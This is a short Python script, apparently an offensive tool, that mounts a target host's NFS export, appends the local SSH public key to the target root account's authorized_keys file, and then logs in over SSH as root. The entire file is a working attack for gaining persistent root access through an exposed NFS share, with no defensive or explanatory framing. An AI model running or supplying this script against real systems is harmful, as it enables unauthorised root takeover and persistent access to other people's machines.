#! /usr/bin/env python
## mount the NFS export, and add the key to th root user account's authorized_key file

import sys
import os

ip = sys.argv[1]

os.system("mkdir /tmp/bob1bob2")

os.system("mount -t nfs %s :/ /tmp/bob1bob2/"% ip)

os.system("cat ~/.ssh/id_rsa.pub >> /tmp/bob1bob2/root/.ssh/authorized_keys ")
os.system("umount /tmp/bob1bob2")
os.system("ssh root@%s" % ip)



